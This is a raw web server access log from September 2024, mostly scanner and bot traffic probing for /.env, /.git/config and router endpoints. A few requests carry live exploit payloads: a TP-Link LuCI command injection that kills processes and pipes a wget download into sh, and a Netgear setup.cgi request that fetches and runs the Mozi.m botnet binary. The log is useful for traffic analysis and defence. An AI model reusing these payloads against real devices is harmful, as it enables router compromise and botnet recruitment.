18.246.14.72 - - [22/Sep/2024:13:56:17 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG-SM-G891A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
18.246.14.72 - - [22/Sep/2024:13:57:09 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3844.0 Safari/537.36"
18.246.14.72 - - [22/Sep/2024:13:57:09 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 - "-" "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G975U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36"
18.246.14.72 - - [22/Sep/2024:13:57:09 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; LG-P870/P87020d Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
18.246.14.72 - - [22/Sep/2024:13:57:09 +0000] "GET /css/login.cs HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"
172.105.128.12 - - [22/Sep/2024:14:09:21 +0000] "\x16\x03\x01" 400 226 "-" "-"
94.102.49.238 - - [22/Sep/2024:14:17:30 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
94.102.49.238 - - [22/Sep/2024:14:18:25 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
94.102.49.238 - - [22/Sep/2024:14:19:01 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
52.91.208.163 - - [22/Sep/2024:14:19:42 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36 Maxthon/5.2.7.2000"
94.102.49.238 - - [22/Sep/2024:14:19:59 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
52.91.208.163 - - [22/Sep/2024:14:20:02 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "Mozilla/5.0 (Linux; Android 8.1.0; GM 6 d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
52.91.208.163 - - [22/Sep/2024:14:20:02 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2"
52.91.208.163 - - [22/Sep/2024:14:20:02 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "Mozilla/4.0 (PSP (PlayStation Portable); 2.00)"
135.125.217.54 - - [22/Sep/2024:14:23:57 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [22/Sep/2024:14:23:57 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [22/Sep/2024:14:51:21 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [22/Sep/2024:14:51:22 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
120.71.59.24 - - [22/Sep/2024:15:17:46 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
185.224.128.47 - - [22/Sep/2024:15:25:23 +0000] "GET / HTTP/1.0" 200 1401 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
95.214.55.138 - - [22/Sep/2024:15:43:41 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.90.42.154 - - [22/Sep/2024:15:59:33 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [22/Sep/2024:15:59:33 +0000] "GET /k8Rg HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; LG; LG-E906)"
91.90.42.154 - - [22/Sep/2024:15:59:34 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; LG; LG-E906)"
91.90.42.154 - - [22/Sep/2024:15:59:34 +0000] "GET /c3af HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; LG; LG-E906)"
80.82.77.202 - - [22/Sep/2024:16:06:02 +0000] "\x16\x03\x02\x01o\x01" 400 226 "-" "-"
80.82.77.202 - - [22/Sep/2024:16:20:37 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 OPR/62.0.3331.116"
172.105.82.111 - - [22/Sep/2024:16:38:40 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
172.105.82.111 - - [22/Sep/2024:16:44:52 +0000] "GET /OEec HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
135.125.217.54 - - [22/Sep/2024:16:47:23 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [22/Sep/2024:16:47:23 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.105.82.111 - - [22/Sep/2024:16:49:41 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
46.101.157.195 - - [22/Sep/2024:16:52:52 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
96.126.104.20 - - [22/Sep/2024:17:11:54 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
96.126.104.20 - - [22/Sep/2024:17:19:42 +0000] "GET /x93x HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
96.126.104.20 - - [22/Sep/2024:17:26:17 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
20.92.230.137 - - [22/Sep/2024:17:48:22 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.92.230.137 - - [22/Sep/2024:17:48:22 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
186.2.171.38 - - [22/Sep/2024:18:02:12 +0000] "GET /.git/config HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1"
200.110.153.22 - - [22/Sep/2024:18:05:35 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
201.217.220.26 - - [22/Sep/2024:18:05:38 +0000] "GET /w9cI HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
135.125.217.54 - - [22/Sep/2024:18:21:33 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [22/Sep/2024:18:21:33 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
186.2.171.38 - - [22/Sep/2024:18:46:03 +0000] "GET /.git/config HTTP/1.1" 302 - "-" "Mozilla/5.0 (Linux; Android 9; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
18.246.14.72 - - [22/Sep/2024:19:28:34 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/7.0.5(0x17000523) NetType/WIFI Language/zh_CN"
18.246.14.72 - - [22/Sep/2024:19:30:10 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
18.246.14.72 - - [22/Sep/2024:19:30:10 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174"
18.246.14.72 - - [22/Sep/2024:19:30:10 +0000] "GET /css/login.cs HTTP/1.1" 302 - "-" "WDG_Validator/1.6.2"
18.246.14.72 - - [22/Sep/2024:19:30:10 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (Linux; Android 7.0; YS900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Iron Safari/537.36"
135.125.217.54 - - [22/Sep/2024:19:39:38 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [22/Sep/2024:19:39:38 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.78 - - [22/Sep/2024:19:39:40 +0000] "GET / HTTP/1.0" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
34.248.192.181 - - [22/Sep/2024:19:40:29 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Linux; Android 4.4.2; SAMSUNG-SM-T537A Build/KOT49H) AppleWebKit/537.36 (KHTML like Gecko) Chrome/35.0.1916.141 Safari/537.36"
172.202.158.63 - - [22/Sep/2024:19:41:06 +0000] "MGLNDD_54.224.97.58_80\n" 400 226 "-" "-"
34.248.192.181 - - [22/Sep/2024:19:42:01 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.35 Safari/537.36"
34.248.192.181 - - [22/Sep/2024:19:42:02 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "msnbot/1.0 ( http://search.msn.com/msnbot.htm)"
34.248.192.181 - - [22/Sep/2024:19:42:02 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36"
185.224.128.83 - - [22/Sep/2024:19:44:02 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
185.224.128.83 - - [22/Sep/2024:19:44:02 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
34.248.192.181 - - [22/Sep/2024:19:44:36 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 530) like Gecko"
34.248.192.181 - - [22/Sep/2024:19:44:36 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36 Vivaldi/1.0.344.37"
34.248.192.181 - - [22/Sep/2024:19:44:36 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 - "-" "Mozilla/5.0 (Linux; Android 9; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
45.79.181.179 - - [22/Sep/2024:19:46:44 +0000] "\x16\x03\x01" 400 226 "-" "-"
91.92.243.155 - - [22/Sep/2024:20:16:41 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
42.235.22.163 - - [22/Sep/2024:20:25:51 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://42.235.22.163:52811/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 302 - "-" "-"
34.248.192.181 - - [22/Sep/2024:20:34:44 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
91.90.42.154 - - [22/Sep/2024:20:35:29 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [22/Sep/2024:20:35:29 +0000] "GET /3mLp HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MASP)"
91.90.42.154 - - [22/Sep/2024:20:35:30 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MASP)"
91.90.42.154 - - [22/Sep/2024:20:35:30 +0000] "GET /hVf9 HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MASP)"
34.248.192.181 - - [22/Sep/2024:20:35:52 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "Opera/8.01 (J2ME/MIDP; Opera Mini/1.0.1479/HiFi; SonyEricsson P900; no; U; ssr)"
34.248.192.181 - - [22/Sep/2024:20:35:52 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3889.0 Safari/537.36"
34.248.192.181 - - [22/Sep/2024:20:35:52 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 - "-" "Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG-SM-G891A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
172.105.82.111 - - [22/Sep/2024:21:13:05 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
172.105.82.111 - - [22/Sep/2024:21:20:08 +0000] "GET /ph6N HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
172.105.82.111 - - [22/Sep/2024:21:24:33 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
135.125.217.54 - - [22/Sep/2024:21:47:11 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [22/Sep/2024:21:47:11 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
35.226.85.27 - - [22/Sep/2024:21:48:53 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
35.226.85.27 - - [22/Sep/2024:21:51:27 +0000] "POST /sdk HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
35.226.85.27 - - [22/Sep/2024:21:51:27 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
35.226.85.27 - - [22/Sep/2024:21:51:27 +0000] "GET /HNAP1 HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
35.226.85.27 - - [22/Sep/2024:21:51:27 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
35.226.85.27 - - [22/Sep/2024:21:51:28 +0000] "GET /evox/about HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
35.226.85.27 - - [22/Sep/2024:21:51:28 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
35.226.85.27 - - [22/Sep/2024:21:51:28 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
35.226.85.27 - - [22/Sep/2024:21:51:49 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
35.226.85.27 - - [22/Sep/2024:21:51:49 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
18.246.14.72 - - [22/Sep/2024:21:54:00 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.145 Safari/537.36 Vivaldi/2.6.1566.51"
18.246.14.72 - - [22/Sep/2024:21:54:55 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
18.246.14.72 - - [22/Sep/2024:21:54:55 +0000] "GET /css/login.cs HTTP/1.1" 302 - "-" "osee2unifiedRelease/1466 osee2unifiedReleaseVersion/6.9.1 Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
18.246.14.72 - - [22/Sep/2024:21:54:55 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"
18.246.14.72 - - [22/Sep/2024:21:54:55 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1"
136.144.17.30 - - [22/Sep/2024:22:21:37 +0000] "GET /ab2g HTTP/1.1" 302 - "-" ""
136.144.17.30 - - [22/Sep/2024:22:21:42 +0000] "GET / HTTP/1.1" 200 1401 "-" ""
136.144.17.30 - - [22/Sep/2024:22:21:43 +0000] "GET /ab2h HTTP/1.1" 302 - "-" ""
136.144.17.30 - - [22/Sep/2024:22:21:49 +0000] "GET / HTTP/1.1" 200 1401 "-" ""
79.124.8.107 - - [22/Sep/2024:22:38:50 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0"
178.255.151.130 - - [22/Sep/2024:23:04:27 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
185.104.187.66 - - [22/Sep/2024:23:04:28 +0000] "GET /MXFq HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0"
135.125.217.54 - - [22/Sep/2024:23:05:17 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [22/Sep/2024:23:05:17 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
96.126.104.20 - - [22/Sep/2024:23:12:27 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
147.185.132.21 - - [22/Sep/2024:23:18:45 +0000] "\x16\x03\x01" 400 226 "-" "-"
147.185.132.21 - - [22/Sep/2024:23:18:46 +0000] "\x16\x03\x01" 400 226 "-" "-"
96.126.104.20 - - [22/Sep/2024:23:19:03 +0000] "GET /SeXL HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
45.155.91.226 - - [22/Sep/2024:23:25:03 +0000] "GET /level/15/exec/-/sh/run/CR HTTP/1.1" 302 - "-" "libwww-perl/6.67"
45.155.91.226 - - [22/Sep/2024:23:25:03 +0000] "GET / HTTP/1.1" 200 1401 "-" "libwww-perl/6.67"
96.126.104.20 - - [22/Sep/2024:23:26:14 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
135.125.217.54 - - [22/Sep/2024:23:47:23 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [22/Sep/2024:23:47:23 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
149.102.251.11 - - [23/Sep/2024:00:04:36 +0000] "GET /58uz HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0"
149.102.251.11 - - [23/Sep/2024:00:04:37 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0"
157.245.77.56 - - [23/Sep/2024:00:09:16 +0000] "\x16\x03\x03\x01\xa5\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:00:09:16 +0000] "\x16\x03\x03\x01\xa5\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:00:09:16 +0000] "\x16\x03\x03\x01V\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:00:09:16 +0000] "\x16\x03\x03\x01H\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:00:09:17 +0000] "\x16\x03\x03\x01\x99\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:00:09:17 +0000] "\x16\x03\x02\x01\x9a\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:00:09:17 +0000] "\x16\x03\x01\x01\xa7\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:00:09:17 +0000] "\x16\x03\x01\x01\xa7\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:00:09:17 +0000] "\x16\x03\x01\x01\x9d\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:00:09:18 +0000] "\x16\x03\x01\x01\xb4\x01" 400 226 "-" "-"
109.204.233.40 - - [23/Sep/2024:00:09:43 +0000] "\x16\x03\x01\x01\x18\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:00:09:49 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:00:10:13 +0000] "GET / HTTP/1.1" 200 1401 "-" "HTTP Banner Detection (https://security.ipip.net)"
157.245.77.56 - - [23/Sep/2024:00:10:45 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "HTTP Banner Detection (https://security.ipip.net)"
157.245.77.56 - - [23/Sep/2024:00:10:55 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:00:11:27 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
91.90.42.154 - - [23/Sep/2024:00:13:45 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [23/Sep/2024:00:13:45 +0000] "GET /jNp4 HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;PTBR)"
91.90.42.154 - - [23/Sep/2024:00:13:45 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;PTBR)"
91.90.42.154 - - [23/Sep/2024:00:13:46 +0000] "GET /vJ3j HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;PTBR)"
205.210.31.134 - - [23/Sep/2024:00:34:15 +0000] "GET / HTTP/1.1" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
45.148.10.242 - - [23/Sep/2024:00:38:47 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 196 "-" "Hello"
172.105.82.111 - - [23/Sep/2024:00:42:21 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
172.105.82.111 - - [23/Sep/2024:00:48:41 +0000] "GET /3nDw HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
91.90.42.154 - - [23/Sep/2024:00:49:14 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [23/Sep/2024:00:49:14 +0000] "GET /i6oN HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; yie9)"
91.90.42.154 - - [23/Sep/2024:00:49:15 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; yie9)"
91.90.42.154 - - [23/Sep/2024:00:49:15 +0000] "GET /QxFN HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; yie9)"
172.105.82.111 - - [23/Sep/2024:00:53:43 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
178.211.139.188 - - [23/Sep/2024:01:48:05 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
135.125.246.110 - - [23/Sep/2024:02:13:10 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [23/Sep/2024:02:13:11 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.42.116.218 - - [23/Sep/2024:02:38:01 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.4.3160.47"
185.224.128.47 - - [23/Sep/2024:02:48:08 +0000] "GET / HTTP/1.0" 200 1401 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
